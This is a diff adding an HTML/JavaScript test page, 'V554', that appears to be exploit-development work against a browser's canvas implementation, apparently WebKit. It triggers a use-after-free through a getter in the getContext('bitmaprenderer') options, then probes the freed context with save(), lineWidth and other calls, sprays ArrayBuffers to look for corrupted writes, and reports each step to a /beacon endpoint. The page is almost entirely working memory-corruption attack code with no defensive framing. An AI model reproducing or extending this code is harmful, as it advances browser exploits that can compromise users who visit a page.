@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V554</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V554-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V554-nospray-tests');
+
+// T1: save() on freed memory (NO AB spray at all)
+// If this WORKS, the freed memory still has valid-ish data (stale context)
+// If this CRASHES, the freed memory has been corrupted by bmalloc free-list
+(function T1(){
+  b('T1-START','save-freed-nospray');
+  var ctx=triggerUAF();
+  b('T1-UAF','ok');
+  // NO spray, NO allocations — just immediate save()
+  b('T1-PRESAVE','about to save on raw freed memory');
+  try{
+    ctx.save();
+    b('T1-SAVE','PASS! save on freed memory works');
+  }catch(e){b('T1-SAVE-ERR',e.message)}
+  b('T1-DONE','ok');
+})();
+
+// T2: lineWidth on freed memory (NO spray)
+(function T2(){
+  b('T2-START','lw-freed-nospray');
+  var ctx=triggerUAF();
+  b('T2-UAF','ok');
+  b('T2-PRELW','about to read lineWidth on freed');
+  try{
+    var lw=ctx.lineWidth;
+    b('T2-LW','lineWidth='+lw);
+  }catch(e){b('T2-LW-ERR',e.message)}
+  b('T2-DONE','ok');
+})();
+
+// T3: getContextAttributes on freed memory (NO spray)
+(function T3(){
+  b('T3-START','attrs-freed-nospray');
+  var ctx=triggerUAF();
+  b('T3-UAF','ok');
+  b('T3-PREATTR','about to getContextAttributes on freed');
+  try{
+    var a=ctx.getContextAttributes();
+    b('T3-ATTR',JSON.stringify(a));
+  }catch(e){b('T3-ATTR-ERR',e.message)}
+  b('T3-DONE','ok');
+})();
+
+// T4: canvas property on freed memory (reads m_canvas pointer)
+(function T4(){
+  b('T4-START','canvas-freed-nospray');
+  var ctx=triggerUAF();
+  b('T4-UAF','ok');
+  b('T4-PRECANVAS','about to read ctx.canvas');
+  try{
+    var c=ctx.canvas;
+    b('T4-CANVAS','canvas='+(c?c.tagName:'null'));
+  }catch(e){b('T4-CANVAS-ERR',e.message)}
+  b('T4-DONE','ok');
+})();
+
+// T5: toString on freed memory (pure JS, should always work)
+(function T5(){
+  b('T5-START','tostr-freed-nospray');
+  var ctx=triggerUAF();
+  b('T5-UAF','ok');
+  try{
+    var s=ctx.toString();
+    b('T5-TOSTR',s);
+  }catch(e){b('T5-TOSTR-ERR',e.message)}
+  b('T5-DONE','ok');
+})();
+
+// T6: save() with AB spray but NO beacons between spray and save
+// (Tests if the beacon itself somehow causes the crash)
+(function T6(){
+  b('T6-START','save-spray-nobeacon');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  // CRITICAL: NO beacon between spray and save
+  try{
+    ctx.save();
+    // If we get here, save() worked! Scan for the write
+    var found='none';
+    for(var a=0;a<50;a++){
+      var u8=new Uint8Array(abs[a]);
+      for(var j=0;j<768;j++){
+        if(u8[j]!==0){
+          found='AB['+a+']:off'+j+'=0x'+u8[j].toString(16);
+          break;
+        }
+      }
+      if(found!=='none') break;
+    }
+    b('T6-RESULT','save_OK:'+found);
+  }catch(e){b('T6-ERR',e.message)}
+  b('T6-DONE','ok');
+})();
+
+// T7: lineWidth with AB spray but NO beacons between spray and read
+(function T7(){
+  b('T7-START','lw-spray-nobeacon');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  // CRITICAL: NO beacon between spray and lineWidth read
+  try{
+    var lw=ctx.lineWidth;
+    b('T7-LW','lineWidth='+lw);
+  }catch(e){b('T7-LW-ERR',e.message)}
+  b('T7-DONE','ok');
+})();
+
+b('DONE','V554-all-complete');
+</script>
+</body></html>
